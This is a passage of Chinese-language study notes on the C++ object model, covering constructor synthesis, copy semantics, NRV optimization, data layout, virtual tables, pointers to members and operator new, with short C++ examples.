Cstr</code>，那么编译器生成的默认构造函数将只提供对string类型成员的初始化，而不会提供对char* 类型的初始化。</p></blockquote><ol start="2" type="1"><li>“带有 Default Constructor”的 Base Class</li></ol><blockquote><p>如果一个没有任何constructors的class派生自一个“带有defaultconstructor”的base class，那么这个derived class 的default constructor会被视为nontrivial，并因此需要被合成出来。它将调用上一层 base classes 的defaultconstructor（根据它们的声明顺序）。对一个后继派生的class而言，这个合成的constructor和一个“被显式提供的defaultconstructor”没有什么差异。</p></blockquote><ol start="3" type="1"><li>“带有一个 Virtual Function”的 Class</li></ol><blockquote><p>另有两种情况，也需要合成出default constructor：</p><ul><li>class声明（或继承）一个 virtual function。</li><li>class派生自一个继承串链，其中有一个或更多的 virtual baseclasses。</li></ul></blockquote><ol start="4" type="1"><li>“带有一个 Virtual Base Class”的 Class</li></ol><blockquote><p>Virtual base class的实现，在不同的编译器之间有极大的差异。然而，每一种实现法的共同点在于必须使virtualbase class在其每一个derived classobject中的空间位置，能够于执行期准备妥当。</p></blockquote><p>被合成出来的constructor只能满足编译器（而非程序）的需要。</p><p>至于没有存在那4种情况而又没有声明任何constructor的classes，实际上defaultconstructor并不会被合成出来。</p><p>在合成的 default constructor 中，只有 base class subobjects 和 memberclass objects 会被初始化。所有其他的nonstatic datamember（如整数、整数指针、整数数组等等）都不会被初始化。</p><p>这些初始化操作对程序而言或许有需要，但对编译器则非必要。如果程序需要一个“把某指针设为0”的defaultconstructor，那么提供它的人应该是程序员。</p><h3><span id="22-copyconstructor的构造操作"><strong>2.2 CopyConstructor的构造操作</strong></span></h3><h4><span id="default-memberwiseinitialization">Default MemberwiseInitialization</span></h4><p>当class object 以“相同 class 的另一个object”作为初值，其内部是以所谓的default memberwiseinitialization手法完成的，也就是把每一个内建的或派生的datamember（例如一个指针或一个数组）的值，从某个object拷贝一份到另一个object身上。</p><p>不过它并不会拷贝其中的 member class object，而是以递归的方式施行memberwise initialization。</p><p>C++Standard上说，如果class没有声明一个copyconstructor，就会有隐式的声明（implicitlydeclared）或隐式的定义（implicitlydefined）出现。和以前一样，C++Standard 把copyconstructor区分为trivial和nontrivial两种。只有nontrivial的实例才会被合成于程序之中。</p><p>决定一个copy constructor是否为trivial的标准在于class是否展现出所谓的“bitwise copy semantics”。</p><h4><span id="bitwise-copysemantics位逐次拷贝">Bitwise CopySemantics（位逐次拷贝）</span></h4><p>在这被合成出来的default copyconstructor中，如整数、指针（浅拷贝）、数组等等的non classmembers也都会被复制。</p><p>什么时候一个class不展现出“bitwise copy semantics”呢？有4种情况：</p><ol type="1"><li>当class内含一个member object而后者的class声明有一个copyconstructor时（不论是被 class设计者显式地声明，就像前面的String那样；或是被编译器合成，像 class Word那样）。</li><li>当class继承自一个base class而后者存在一个copyconstructor时（不论是被显式声明或是被合成而得）。</li><li>当class声明了一个或多个virtual functions时。</li><li>当class派生自一个继承串链，其中有一个或多个virtual baseclasses时。</li></ol><h4><span id="重新设定virtual-table的指针">重新设定Virtual Table的指针</span></h4><p>回忆编译期间的两个程序扩张操作（只要有一个class声明了一个或多个virtualfunctions就会如此）：</p><ul><li>增加一个virtual function table（vtbl），内含每一个有作用的virtualfunction的地址。</li><li>一个指向virtual function table的指针（vptr），安插在每一个classobject内。</li></ul><p>编译器合成出来的 copy constructor 会显式设定 lhs object的 vptr 指向rhs 的 virtual table，而不是直接从rhs的class object中将vptr值拷贝过来。</p><h4><span id="处理-virtual-base-classsubobject">处理 Virtual Base ClassSubobject</span></h4><blockquote><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span>&#123;</span><br> <span class="hljs-keyword">int</span> x;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span> :</span> Base &#123;<br> <span class="hljs-keyword">int</span> y;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在这个继承体系里，每个 Derived 类型的 object 就包含了一个 Base 类型的subobject 。</p><p>一个subobject可以是成员子对象（member subobject），基类子对象（baseclass subobject），或者成员数组的元素。</p></blockquote><p>Virtual base class的存在需要特别处理。一个class object如果以另一个object作为初值，而后者有一个 virtual base classsubobject，那么也会使“bitwise copy semantics”失效。</p><p>每一个编译器对于虚继承，都必须让“derived class object中的virtual baseclasssubobject位置”在执行期就准备妥当。维护“位置的完整性”是编译器的责任。</p><p>“Bitwise copy semantics”可能会破坏这个位置。</p><h4><span id="小结">小结</span></h4><p>Bitwise CopySemantics部分展示了4种情况，在那些情况下class不再保持“bitwise copysemantics”，而且 default copy constructor 会被视为 nontrivial。</p><blockquote><ol type="1"><li>当class内含一个member object而后者的class声明有一个copyconstructor时（不论是被 class设计者显式地声明，就像前面的String那样；或是被编译器合成，像 class Word那样）。</li><li>当class继承自一个base class而后者存在一个copyconstructor时（不论是被显式声明或是被合成而得）。</li><li>当class声明了一个或多个virtual functions时。</li><li>当class派生自一个继承串链，其中有一个或多个virtual baseclasses时。</li></ol></blockquote><p>在这4种情况下，如果缺乏一个已声明的 copyconstructor，编译器为了正确处理“以一个class object 作为另一个classobject 的初值”，必须合成出一个default copy constructor。</p><h3><span id="23-程序转化语意学"><strong>2.3 程序转化语意学</strong></span></h3><p>转化</p><ul><li>显式的初始化操作（Explicit Initialization）</li><li>参数的初始化（Argument Initialization）</li><li>返回值的初始化（Return Value Initialization）</li></ul><p>优化方法：</p><ul><li>在使用者层面做优化（Optimization at the User Level）</li><li>在编译器层面做优化（Optimization at the Compiler Level）。NamedReturn Value（NRV）优化</li></ul><p>copyconstructor的应用，迫使编译器多多少少对你的程序代码做部分转化。尤其是当一个函数以传值（byvalue）的方式传回一个class object，而该class有一个copyconstructor时。</p><p>此外，编译器也将copyconstructor的调用操作优化，以一个额外的第一参数（数值被直接存放于其中）取代NRV。程序员如果了解那些转换，以及copy constructor优化后的可能状态，就比较能够控制其程序的执行效率。</p><h4><span id="命名返回值优化named-return-value-optimization">命名返回值优化（Named Return Value Optimization）</span></h4><p>对于一个如<code>foo()</code>这样的函数，它的每一个返回分支都返回相同的对象，编译器有可能对其做NamedreturnValue优化（下文都简称NRV优化），方法是以引用的方式传入一个参数<code>result</code>取代返回对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">X <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>&#123; <br>    X xx; <br>    <span class="hljs-keyword">if</span>(...) <br>        <span class="hljs-keyword">return</span> xx; <br>    <span class="hljs-keyword">else</span> <br>        <span class="hljs-keyword">return</span> xx; <br>&#125;<br></code></pre></div></td></tr></table></figure><p>优化后的<code>foo()</code>以<code>result</code>取代<code>xx</code>：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">foo</span><span class="hljs-params">(X &amp;result)</span> </span>&#123;<br>    result.X::X();<br>    <span class="hljs-keyword">if</span>(...) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对比优化前与优化后的代码可以看出，对于一句类似于<code>X a = foo()</code>这样的代码，NRV优化后的代码相较于原代码节省了一个临时对象的空间（省略了xx），同时减少了两次函数调用（减少xx对象的默认构造函数和析构函数，以及一次拷贝构造函数的调用），增加了一次X a 的默认构造函数的调用。</p><h3><span id="24成员们的初始化队伍member-initialization-list"><strong>2.4成员们的初始化队伍（Member Initialization List）</strong></span></h3><p>当你写下一个constructor时，就有机会设定classmembers的初值。经由member initializationlist，或在constructor函数本体之内。</p><p>在下列情况下，为了让你的程序能够被顺利编译，你必须使用memberinitialization list：</p><ol type="1"><li>当初始化一个reference member时；</li><li>当初始化一个const member时；</li><li>当调用一个baseclass的constructor，而它拥有一组参数，没有默认构造函数时；</li><li>当调用一个memberclass的constructor，而它拥有一组参数，没有默认构造函数时。</li></ol><p>前两者因为要求定义时初始化，所以必须明确的在初始化队列中给它们提供初值。后两者因为不提供默认构造函数，所有必须显示的调用它们的带参构造函数来定义即初始化它们。</p><p>编译器会一一操作initializationlist，以适当顺序在constructor之内安插初始化操作，并且在任何explicit usercode之前。list中的项目顺序是由class中的members声明顺序决定的，不是由initializationlist中的排列顺序决定的。</p><p>简略地说，编译器会对initialization list一一处理并可能重新排序，以反映出members的声明顺序。它会安插一些代码到constructor体内，并置于任何explicituser code之前。initialzation list 的执行先于用户自定义的函数体。</p><h2><span id="三-data语意学the-semanticsof-data">三、Data语意学（The Semanticsof Data）</span></h2><p>class的data members以及class hierarchy是中心议题。一个class的datamembers，一般而言，可以表现这个class在程序执行时的某种状态。Nonstaticdata members放置的是“个别的class object”感兴趣的数据，static datamembers则放置的是“整个class”感兴趣的数据。</p><p>C++对象模型尽量以空间优化和存取速度优化的考虑来表现nonstatic datamembers，并且保持和C语言struct数据配置的兼容性。它把数据直接存放在每一个classobject之中。对于继承而来的nonstatic data members（不管是virtual还是nonvirtual baseclass）也是如此。不过并没有强制定义其间的排列顺序。</p><p>至于static data members，则被放置在程序的一个global data segment中，不会影响个别的classobject的大小。在程序之中，不管该class被产生出多少个objects（经由直接产生或间接派生），staticdatamembers永远只存在一份实例（译注：甚至即使该class没有任何object实例，其staticdata members也已存在）。</p><h3><span id="31-data-member的绑定">3.1 Data Member的绑定</span></h3><p>在一个inline member function体之内的一个datamember绑定操作，会在整个class声明完成之后才发生。然而，这对于memberfunction的argument list并不为真。Argumentlist中的名称还是会在它们第一次遭遇时被适当地决议（resolved）完成。</p><p>需要某种防御性程序风格：请总是把“nestedtype声明”放在class的起始处。</p><h3><span id="32-data-member的布局">3.2 Data Member的布局</span></h3><p>Nonstatic data members在classobject中的排列顺序将和其被声明的顺序一样，任何中间介入的static datamembers都不会被放进对象布局之中。</p><p>编译器还可能会合成一些内部使用的datamembers，以支持整个对象模型。vptr就是这样的东西，目前所有的编译器都把它安插在每一个“内含virtualfunction之class”的 object 内。一些编译器把vptr放在一个classobject的最前端。</p><p>在VC中数据成员的布局顺序为：</p><ol type="1"><li>vptr部分（如果基类有，则继承基类的）</li><li>vbptr （如果需要）</li><li>基类成员（按声明顺序）</li><li>自身数据成员</li><li>虚基类数据成员（按声明顺序）</li></ol><h3><span id="33-data-member的存取">3.3 Data Member的存取</span></h3><h4><span id="static-data-members">Static Data Members</span></h4><p>每一个static data member只有一个实例，存放在程序的datasegment之中。每次程序参阅（取用）staticmember时，就会被内部转化为对该唯一extern实例的直接参考操作。</p><p>static member并不内含在一个class object之中。</p><p>若名称冲突，编译器的解决方法是暗中对每一个static datamember编码（这种手法有个很美的名称：name-mangling），以获得一个独一无二的程序识别代码。</p><h4><span id="nonstatic-data-members">Nonstatic Data Members</span></h4><p>Nonstatic data members直接存放在每一个class object之中。除非经由显式的（explicit）或隐式的（implicit）classobject，否则没有办法直接存取它们。</p><p>欲对一个nonstatic data member进行存取操作，编译器需要把classobject的起始地址加上data member的偏移位置（offset）。</p><h3><span id="34-继承与data-member">3.4 “继承”与Data Member</span></h3><p>在C++继承模型中，一个derived classobject所表现出来的东西，是其自己的members加上其base class（es）members的总和。至于derived class members和baseclass（es）members的排列顺序，则并未在C++Standard中强制指定；理论上编译器可以自由安排之。在大部分编译器上头，baseclass members总是先出现，但属于virtual baseclass的除外（一般而言，任何一条通则一旦碰上virtual baseclass就没辙了，这里亦不例外）。</p><p>只要继承不要多态（Inheritance without Polymorphism）</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/16-39-21-75460e.png" srcset="/img/loading.gif" lazyload></p><p>加上多态（Adding Polymorphism）</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/16-41-44-c7c218.png" srcset="/img/loading.gif" lazyload></p><p>虚拟继承（Virtual Inheritance）</p><p>多重继承的一个语意上的副作用就是，它必须支持某种形式的“sharedsubobject继承”。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/16-44-47-99bf2a.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/16-46-02-3ae8c2.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/16-48-17-0474b0.png" srcset="/img/loading.gif" lazyload></p><p>虚继承的子类有自己的一个vptr。</p><h3><span id="35-对象成员的效率">3.5 对象成员的效率</span></h3><p>单一继承应该不会影响测试的效率，因为members被连续存储于derived classobject中，并且其offset在编译时期就已知了。虚拟继承的效率会降低。</p><h3><span id="36-指向data-members的指针">3.6 指向Data Members的指针</span></h3><p>如何区分一个“没有指向任何data member”的指针，和一个指向“第一个datamember”的指针？</p><p>为了区分p1和p2，每一个真正的memberoffset值都被加上1。不论编译器或使用者都必须记住，在真正使用该值以指出一个member之前，请先减掉1。</p><h2><span id="四-function语意学">四、Function语意学</span></h2><p>C++支持三种类型的member functions：static、nonstatic和virtual。</p><h3><span id="41-member-的各种调用方式">4.1 Member 的各种调用方式</span></h3><h4><span id="nonstatic-memberfunctions非静态成员函数">Nonstatic MemberFunctions（非静态成员函数）</span></h4><p>C++的设计准则之一就是：nonstatic memberfunction至少必须和一般的nonmember function有相同的效率。</p><p>名称的特殊处理（NameMangling）一般而言，member的名称前面会被加上class名称，形成独一无二的命名。</p><h4><span id="virtual-memberfunctions虚拟成员函数">Virtual MemberFunctions（虚拟成员函数）</span></h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">( * ptr-&gt;vptr[<span class="hljs-number">1</span>])( ptr )<br></code></pre></div></td></tr></table></figure><ul><li>vptr表示由编译器产生的指针，指向virtualtable。它被安插在每一个“声明有（或继承自）一个或多个 virtualfunctions”的classobject中。事实上其名称也会被“mangled”，因为在一个复杂的class派生体系中，可能存在多个vptrs。</li><li>1是virtual table slot的索引值，关联到 normalize()函数。</li><li>第二个ptr表示this指针。</li></ul><h4><span id="static-memberfunctions静态成员函数">Static MemberFunctions（静态成员函数）</span></h4><p>如果取一个static memberfunction的地址，获得的将是其在内存中的位置，也就是其地址。由于staticmember function没有this指针，所以其地址的类型并不是一个“指向class memberfunction的指针”，而是一个“nonmember函数指针”。</p><h3><span id="42-virtual-memberfunctions虚拟成员函数">4.2 Virtual MemberFunctions（虚拟成员函数）</span></h3><p>virtual function的一般实现模型：每一个class有一个virtualtable，内含该class之中有作用的virtualfunction的地址，然后每个object有一个vptr，指向virtual table的所在。</p><p>在C++中，多态（polymorphism）表示“以一个public base class的指针（或reference），寻址出一个derived class object”的意思。</p><p>C++对“积极多态（active polymorphism）”的唯一支持，就是对于virtualfunctioncall的决议（resolution）操作。有了RTTI，就能够在执行期查询一个多态的pointer或多态的reference了。</p><p>欲鉴定哪些 classes展现多态特性，我们需要额外的执行期信息。一如我所说，关键词class和struct并不能够帮助我们。由于没有导入像是polymorphic之类的新关键词，因此识别一个class是否支持多态，唯一适当的方法就是看看它是否有任何virtualfunction。只要class拥有一个virtualfunction，它就需要这份额外的执行期信息。</p><p>在实现上，首先我可以在每一个多态的classobject身上增加两个members：</p><ol type="1"><li>一个字符串或数字，表示class的类型；</li><li>一个指针，指向某表格，表格中持有程序的virtualfunctions的执行期地址。</li></ol><p>然而，执行期备妥那些函数地址，只是解答的一半而已。另一半解答是找到那些地址。两个步骤可以完成这项任务：</p><ol type="1"><li>为了找到表格，每一个classobject被安插了一个由编译器内部产生的指针，指向该表格。</li><li>为了找到函数地址，每一个virtual function被指派一个表格索引值。</li></ol><p>这些工作都由编译器完成。执行期要做的，只是在特定的virtual tableslot（记录着virtual function的地址）中激活virtual function。</p><p>一个class只会有一个virtual table。每一个table内含其对应之classobject中所有active virtual functions函数实例的地址。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/17-21-32-766403.png" srcset="/img/loading.gif" lazyload></p><p>现在，如果我有这样的式子：<code>ptr-&gt;z()</code></p><p>我如何有足够的知识在编译时期设定virtual function的调用呢？</p><ul><li>一般而言，在每次调用<code>z()</code>时，我并不知道ptr所指对象的真正类型。然而我知道，经由ptr可以存取到该对象的virtual table。</li><li>虽然我不知道哪一个<code>z()</code>函数实例会被调用，但我知道每一个<code>z()</code>函数地址都被放在slot4中。这些信息使得编译器可以将该调用转化为：<code>(*ptr-&gt;vptr[4])(ptr)</code></li></ul><h4><span id="多重继承下的virtualfunctions">多重继承下的VirtualFunctions</span></h4><p>在多重继承中支持virtual functions，其复杂度围绕在第二个及后继的baseclasses身上，以及“必须在执行期调整this指针”这一点。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/17-28-33-d2aed0.png" srcset="/img/loading.gif" lazyload></p><h4><span id="虚拟继承下的virtualfunctions">虚拟继承下的VirtualFunctions</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/C++对象模型笔记_pic/2022/06/30/21-00-15-685d82.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>右下角的vtbl有问题，指的应该是Point2d的函数地址。</p><h3><span id="43-函数的效能">4.3 函数的效能</span></h3><p>nonmember、static member或nonstaticmember函数都被转化为完全相同的形式。所以我们毫不惊讶地看到三者的效率完全相同。</p><h3><span id="44-指向member-function的指针">4.4 指向Member Function的指针</span></h3><p>取一个nonstatic datamember的地址，得到的结果是该member在class布局中的bytes位置（再加1）。你可以想象它是一个不完整的值，它需要被绑定于某个classobject的地址上，才能够被存取。取一个nonstatic memberfunction的地址，如果该函数是nonvirtual，得到的结果是它在内存中真正的地址。然而这个值也是不完全的。它也需要被绑定于某个classobject的地址上，才能够通过它调用该函数。所有的nonstatic memberfunctions都需要对象的地址（以参数this指出）。</p><p>使用一个“member function指针”，如果并不用于virtualfunction、多重继承、virtual baseclass等情况的话，并不会比使用一个“nonmemberfunction指针”的成本更高。</p><h4><span id="支持指向-virtualmember-functions的指针">支持“指向 VirtualMember Functions”的指针</span></h4><p>对一个nonstatic memberfunction取其地址，将获得该函数在内存中的地址。然而面对一个virtualfunction，其地址在编译时期是未知的，所能知道的仅是virtualfunction在其相关之virtual table中的索引值。也就是说，对一个virtualmember function取其地址，所能获得的只是一个索引值。</p><h4><span id="指向-memberfunctions之指针的效率">“指向 MemberFunctions之指针”的效率</span></h4><p>一个“指向memberfunction的指针”，是一个结构，内含三个字段：index、faddr和delta。index若不是内含一个相关virtualtable的索引值，就是以-1表示函数是nonvirtual。faddr持有nonvirtual memberfunction 的地址。delta持有一个可能的this指针调整值。</p><h3><span id="45-inline-functions">4.5 Inline Functions</span></h3><p>一般而言，处理一个inline函数，有两个阶段：</p><ol type="1"><li>分析函数定义，以决定函数的“intrinsic inline ability”（本质的inline能力）。“intrinsic”（本质的、固有的）一词在这里意指“与编译器相关”。如果函数因其复杂度，或因其建构问题，被判断不可成为inline，它会被转为一个static函数，并在“被编译模块”内产生对应的函数定义。</li><li>真正的inline函数扩展操作是在调用的那一点上。这会带来参数的求值操作（evaluation）以及临时性对象的管理。</li></ol><h4><span id="局部变量local-variables">局部变量（Local Variables）</span></h4><p>一般而言，inline函数中的每一个局部变量都必须被放在函数调用的一个封闭区段中，拥有一个独一无二的名称。如果inline函数以单一表达式（expression）扩展多次，则每次扩展都需要自己的一组局部变量。如果inline函数以分离的多个式子（discretestatements）被扩展多次，那么只需一组局部变量，就可以重复使用（译注：因为它们被放在一个封闭区段中，有自己的scope）。</p><p>然而一个inline函数如果被调用太多次的话，会产生大量的扩展码，使程序大小暴涨。</p><h2><span id="五-构造-析构-拷贝语意学">五、构造、析构、拷贝语意学</span></h2><p>一般而言，class的datamember应该被初始化，并且只在constructor中或是在class的其他memberfunctions中指定初值。其他任何操作都将破坏封装性质，使class的维护和修改更加困难。</p><h3><span id="51-无继承情况下的对象构造">5.1 “无继承”情况下的对象构造</span></h3><p>可以定义和调用（invoke）一个pure virtualfunction；不过它只能被静态地调用（invokedstatically），不能经由虚拟机制调用。</p><p>唯一的例外就是pure virtualdestructor：class设计者一定得定义它。为什么？因为每一个derived classdestructor会被编译器加以扩张，以静态调用的方式调用其“每一个virtual baseclass”以及“上一层base class”的destructor。因此，只要缺乏任何一个baseclass destructors的定义，就会导致链接失败。</p><p>这样的设计是以C++语言的一个保证为前提：继承体系中每一个classobject的destructors都会被调用。所以编译器不能够压抑这一调用操作。一个比较好的替代方案就是，不要把virtualdestructor声明为pure。</p><h3><span id="52-继承体系下的对象构造">5.2 继承体系下的对象构造</span></h3><p>constructor的执行算法通常如下：</p><ol type="1"><li>在derived class constructor中，“所有virtual baseclasses”及“上一层base class”的 constructors会被调用。</li><li>上述完成之后，对象的vptr(s)被初始化，指向相关的virtualtable(s)。</li><li>如果有member initializationlist的话，将在constructor体内扩展开来。这必须在vptr被设定之后才做，以免有一个virtualmember function被调用。</li><li>最后，执行程序员所提供的代码。</li></ol><h3><span id="53-对象复制语意学objectcopy-semantics">5.3 对象复制语意学（ObjectCopy Semantics）</span></h3><p>尽可能不要允许一个virtual baseclass的拷贝操作。我甚至提供一个比较奇怪的建议：不要在任何virtual baseclass中声明数据。</p><h3><span id="54-析构语意学semantics-ofdestruction">5.4 析构语意学（Semantics ofDestruction）</span></h3><p>如果class没有定义destructor，那么只有在class内含的member object（或class自己的baseclass）拥有destructor的情况下，编译器才会自动合成出一个来。否则，destructor被视为不需要，也就不需被合成（当然更不需要被调用）。</p><h3><span id="小结">小结</span></h3><ol type="1"><li><p><strong>即使是一个抽象基类，如果它有非静态数据成员，也应该给它提供一个带参数的构造函数，来初始化它的数据成员。</strong>类的datamember应当被初始化，且只在其构造函数或其memberfunction中初始化。</p></li><li><p><strong>不要将析构函数设计为纯虚的，这不是一个好的设计。</strong>将析构函数设计为纯虚函数意味着，即使纯虚函数在语法上允许我们只声明而不定义纯虚函数，但还是必须实现该纯虚析构函数，否则它所有的继承类都将遇到链接错误。</p></li><li><p><strong>真的必要的时候才使用虚函数，不要滥用虚函数。</strong>虚函数意味着不小的成本，编译很可能给你的类带来膨胀效应。</p></li><li><p><strong>不能决定一个虚函数是否需要 const，那么就不要它。</strong></p></li><li><p><strong>决不在构造函数或析构函数中使用虚函数机制。</strong>在构造函数中，每次调用虚函数会被决议为当前构造函数所对应类的虚函数实体，虚函数机制并不起作用。</p></li></ol><h2><span id="六-执行期语意学runtimesemantics">六、执行期语意学（RuntimeSemantics）</span></h2><p>C++的一件困难事情：不太容易从程序源码看出表达式的复杂度。</p><p>一般而言我们会把object尽可能放置在使用它的那个程序区段附近，这么做可以节省非必要的对象产生操作和摧毁操作。</p><h3><span id="61-对象的构造和析构">6.1 对象的构造和析构</span></h3><h4><span id="全局对象global-objects">全局对象（Global Objects）</span></h4><p>由于这样的限制，下面这些munch策略就浮现出来了：</p><ol type="1"><li>为每一个需要静态初始化的文件产生一个<code>_sti()</code>函数，内含必要的constructor调用操作或inlineexpansions。</li><li>在每一个需要静态的内存释放操作（staticdeallocation）的文件中，产生一个<code>__std()</code>函数（译注：我想std就是staticdeallocation的缩写），内含必要的destructor调用操作，或是其 inlineexpansions。</li><li>提供一组runtimelibrary“munch”函数：一个<code>_main()</code>函数（用以调用可执行文件中的所有<code>__sti()</code>函数），以及一个<code>exit()</code>函数（以类似方式调用所有的<code>__std()</code>函数）。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/06/03/17-58-07-9e4bf3.png" srcset="/img/loading.gif" lazyload></p><p>Lippman建议：根本就不要使用那些需要静态初始化的全局对象。真的非要一个全局对象，而且这个对象还需要静态初始化？用一个函数封装一个静态局部对象，也是一样的效果。</p><h3><span id="62-new和delete运算符">6.2 new和delete运算符</span></h3><p>运算符newexpression运算的使用，看起来似乎是个单一运算。<code>int *p=new int (5)</code>实际上包含着两个步骤：</p><ol type="1"><li>调用一个合适的operator new实体分配足够的未类型化的内存。</li><li>调用合适的构造函数初始化这块内存，当然<code>int</code>没有构造函数，但是会进行赋值操作：<code>*p=5</code>。</li></ol><p>delete寻找数组维度，对于delete运算符的效率带来极大的冲击，所以才导致这样的妥协：只有在中括号出现时，编译器才寻找数组的维度，否则它便假设只有单独一个objects要被删除。如果程序员没有提供必须的中括号，那么就只有第一个元素会被析构。其他的元素仍然存在——虽然其相关的内存已经被要求归还了。</p><h4><span id="new-expression和operator-new">new expression和operator new</span></h4><p>new expression和operator new完全不是一回事，但关系不浅——operator new为new expression分配内存。且不能重定义new或delete expression的行为。</p><p>operatornew其实也是可以直接利用的，譬如当我们只想分配内存，而不愿意进行初始化的时候，我们就可以直接用operatornew 来进行。用法如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">T* newelements = <span class="hljs-keyword">static_cast</span>&lt;T*&gt;(<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span> ( <span class="hljs-keyword">sizeof</span>(T) );<br></code></pre></div></td></tr></table></figure><p>标准库重载有两个版本的operatornew，分别为单个对象和数组对象服务，单个对象版本的提供给分配单个对象newexpression调用，数组版的提供给分配数组的 new expression 调用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span>)</span></span>;     <span class="hljs-comment">// allocate an object</span><br><span class="hljs-keyword">void</span> *<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-keyword">size_t</span>);   <span class="hljs-comment">// allocate an array</span><br></code></pre></div></td></tr></table></figure><p>我们可以分别重载这两个版本，来定义我们自己的分配单个对象或对象数组的内存方式。当我们自己在重载operatornew时，不一定要完全按照上面两个版本的原型重载，唯一的两个要求是：返回一个<code>void*</code>类型和第一个参数的类型必须为<code>size_t</code>。</p><p>在类中重载的operator new和operatordelete是隐式静态的，因为前者运行于对象构造之前，后者运行于对象析构之后，所以他们不能也不应该拥有一个this指针来存取数据。</p><h4><span id="placement-operator-new">placement operator new</span></h4><p>placement operatornew用来在指定地址上构造对象，要注意的是，它并不分配内存，仅仅是对指定地址调用构造函数。</p><p><code>point *pt = new(p) point3d;</code></p><p>它是operatornew的一个重载版本。它的实现方式异常简单，传回一个指针即可：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">site_t</span>,<span class="hljs-keyword">void</span> *p)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看一份代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base</span> &#123;</span><br>    <span class="hljs-keyword">int</span> j; <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>; <br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Derived</span> :</span> Base &#123; <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>; <br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fooBar</span><span class="hljs-params">()</span> </span>&#123;  <br>   Base b;  <br>   b.f(); <span class="hljs-comment">// Base::f() invoked  </span><br>   b.~Base();  <span class="hljs-comment">//析构掉了，但是内存并未释放掉</span><br>   <span class="hljs-keyword">new</span> (&amp;b) Derived; <br>   b.f(); <span class="hljs-comment">// which f() invoked?  